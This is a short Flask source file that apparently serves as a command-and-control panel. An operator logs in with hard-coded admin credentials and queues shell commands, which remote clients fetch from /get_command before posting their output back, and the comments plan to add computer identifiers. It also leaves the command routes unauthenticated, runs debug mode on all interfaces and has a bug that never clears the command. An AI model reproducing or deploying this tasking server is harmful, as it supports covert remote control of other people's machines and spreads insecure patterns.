from flask import Flask, render_template, request, redirect, url_for, session

# FIX COMMAND NOT CHANGING BACK TO EMTPY
# DO CSS FOR /INPUT 
# ADD COMPUTER IDENTIFIERS
# MAKE HTML BETTER FOR /INPUT SHIT SO FUCKING TRASH RIGHT NOW

# Note To Self, Web Dev Fucking Sucks


app = Flask(__name__)
app.secret_key = 'supersecretkey'  # Necessary for flash messages

username = "admin"
password = "admin"
output = ""
command = ""
##com_output = None

@app.route("/login", methods=['POST', 'GET'])
def login():
    error = "Username or Password is incorrect"
    if request.method == "POST":
        user = request.form['username']
        passs = request.form['password']

        if user == username and passs == password:
            return redirect(url_for('input'))
        else:
            return render_template("login.html", error=error)

    return render_template("login.html")


@app.route("/input", methods=['GET', 'POST'])
def input():
    out = output
    return render_template("input.html", output=out)

@app.route("/update_command", methods=['POST'])
def update_command():
    global command
    command = request.form.get('command')
    return redirect(url_for("input"))


@app.route("/get_command", methods=['GET'])
def get_command():
    global command
    if command:
        return command
    else:
        return "No command available."

@app.route("/send_command", methods=['POST'])
def send_command():
    if request.method == "POST":
        command = ""
        global output
        output = request.form.get('output') # Store the output in the session
       
        return '', 204  # Return no content to avoid redirection or message
        
        
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80, debug=True)
